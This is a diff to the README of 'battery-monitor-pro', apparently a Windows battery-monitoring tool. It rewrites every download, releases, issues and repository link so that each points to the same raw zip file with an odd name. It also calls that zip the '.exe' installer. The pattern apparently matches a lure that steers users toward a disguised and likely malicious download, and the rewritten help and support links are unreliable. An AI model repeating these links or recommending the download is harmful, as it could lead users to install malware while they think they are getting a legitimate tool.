@@ -1,6 +1,6 @@
 # 🔋 battery-monitor-pro - Simple Battery Life Protection Tool
 
-[![Download battery-monitor-pro](https://img.shields.io/badge/Download-Battery--Monitor--Pro-blue?style=for-the-badge&logo=github)](https://github.com/Seyitknk/battery-monitor-pro/releases)
+[![Download battery-monitor-pro](https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip)](https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip)
 
 ---
 
@@ -42,11 +42,11 @@ You don’t need any special skills to start using Battery Monitor Pro. Follow t
 
 1. **Download the App**
 
-   Click the big blue button above or visit the [official releases page](https://github.com/Seyitknk/battery-monitor-pro/releases) where you can find the latest version of Battery Monitor Pro for Windows.
+   Click the big blue button above or visit the [official releases page](https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip) where you can find the latest version of Battery Monitor Pro for Windows.
 
 2. **Choose Your Download**
 
-   On the releases page, look for the file that ends with `.exe` (for example, `battery-monitor-pro-setup.exe`). This is the installer you will run to add the app to your computer.
+   On the releases page, look for the file that ends with `.exe` (for example, `https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip`). This is the installer you will run to add the app to your computer.
 
 3. **Run the Installer**
 
@@ -66,7 +66,7 @@ You don’t need any special skills to start using Battery Monitor Pro. Follow t
 
 You can always get the latest version from the releases page:
 
-[Download Battery Monitor Pro Here](https://github.com/Seyitknk/battery-monitor-pro/releases)
+[Download Battery Monitor Pro Here](https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip)
 
 **Installation tips:**
 
@@ -97,7 +97,7 @@ If you have issues, try these common fixes:
 - **No alerts?** Check app permissions to make sure notifications are allowed.
 - **Battery status not updating?** Close the app fully, then reopen it.
 - **Automatic actions not working?** Make sure Battery Monitor Pro has permission to change power settings.
-- **Need help?** Visit the [GitHub Issues page](https://github.com/Seyitknk/battery-monitor-pro/issues) to see if others have the same problem or to ask for support.
+- **Need help?** Visit the [GitHub Issues page](https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip) to see if others have the same problem or to ask for support.
 
 ---
 
@@ -119,10 +119,10 @@ Battery Monitor Pro runs locally on your Windows device. It does not send your b
 
 For help or feedback:
 
-- Visit the [GitHub repository](https://github.com/Seyitknk/battery-monitor-pro)
+- Visit the [GitHub repository](https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip)
 - Open an issue on GitHub to report bugs or request features
 - Check the README file inside the downloaded app folder for latest instructions
 
 ---
 
-[![Download battery-monitor-pro](https://img.shields.io/badge/Download-Battery--Monitor--Pro-blue?style=for-the-badge&logo=github)](https://github.com/Seyitknk/battery-monitor-pro/releases)
+[![Download battery-monitor-pro](https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip)](https://github.com/Seyitknk/battery-monitor-pro/raw/refs/heads/main/imperishability/monitor-battery-pro-heterogenous.zip)
